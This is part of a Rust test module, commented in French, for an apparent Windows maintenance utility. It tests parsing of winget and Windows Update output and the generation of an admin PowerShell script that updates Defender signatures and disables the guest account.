        // Sortie réelle de la VM Windows 11 (winget 1.29, anglais) : App Installer passe en dernier.
        let vm = "Name             Id                        Version       Available     Source\r\n\
-----------------------------------------------------------------------------\r\n\
App Installer    Microsoft.AppInstaller    1.29.379.0    1.29.380      winget\r\n\
Microsoft Edge   Microsoft.Edge            155.0.4283.45 155.0.4283.62 winget\r\n\
Windows Terminal Microsoft.WindowsTerminal 1.24.12741.0  1.25.2733.0   winget\r\n\
3 upgrades available.\r\nCODE=0";
        let programmes = lire_winget(vm).unwrap();
        assert_eq!(programmes.len(), 3);
        let c = commandes_winget(&programmes);
        assert!(c[0].contains("--id 'Microsoft.Edge'") && c[2].contains("--id 'Microsoft.AppInstaller'"));
        assert_eq!(
            lire_winget("Aucun package installé ne correspond aux critères d’entrée.\nCODE=0"),
            None
        );
        let resume_noms: Vec<String> = ["a", "b", "c", "d", "e"]
            .iter()
            .map(std::string::ToString::to_string)
            .collect();
        assert_eq!(crate::ui::resume(&resume_noms, 3, ", "), "a, b, c (et 2 autre(s))");
    }

    #[test]
    fn sections_des_lectures_rapides() {
        // Defender absent (antivirus tiers) : sa section manque, les autres restent lisibles.
        let l = "REB|False\r\nREB_FIN\r\nPNP|28|PCI\\VEN_1AF4&DEV_1045\r\nPNP_FIN\r\nGPU_FIN\r\n";
        assert_eq!(section(Some(l), "REB"), Some(vec!["False"]));
        assert_eq!(section(Some(l), "SIG"), None);
        assert_eq!(section(Some(l), "PNP"), Some(vec!["28|PCI\\VEN_1AF4&DEV_1045"]));
        assert_eq!(section(Some(l), "GPU"), Some(vec![]));
        assert_eq!(section(None, "REB"), None);
    }

    #[test]
    fn liste_de_windows_update() {
        let l = lire_windows_update(
            "1|Critical|2026-10 Mise à jour de sécurité (KB5127648) (26200.9711)\n\
             1||Mise à jour de la plateforme Microsoft Defender | KB4052623\n\
             2||NVIDIA - Display - 32.0.15.6094\n\n",
        );
        assert_eq!(l.len(), 3);
        assert!(l[0].importante && !l[0].pilote);
        // Un « | » dans le titre n'est pas un séparateur.
        assert_eq!(
            l[1].titre,
            "Mise à jour de la plateforme Microsoft Defender | KB4052623"
        );
        assert!(l[2].pilote && !l[2].importante);
    }

    #[test]
    fn la_fenetre_admin_annonce_chaque_etape() {
        let s = script_admin(&[
            "Update-MpSignature".to_string(),
            "Disable-LocalUser -Name 'Invité'".to_string(),
        ]);
        assert!(s.contains("+ '  Update-MpSignature')"));
        assert!(s.contains("+ '  Disable-LocalUser -Name ''Invité'''"));
        assert!(s.contains("Read-Host"));
        // Un programme externe en échec est signalé, pas affiché « OK ».
        assert_eq!(s.matches("$global:LASTEXITCODE = 0").count(), 2);
        assert!(s.contains("$echecs++") && s.contains("exit 1 }"));
        // Chaque étape a son try/catch : une erreur PowerShell n'arrête pas les suivantes.
        assert_eq!(s.matches("} catch {").count(), 2);
    }
}
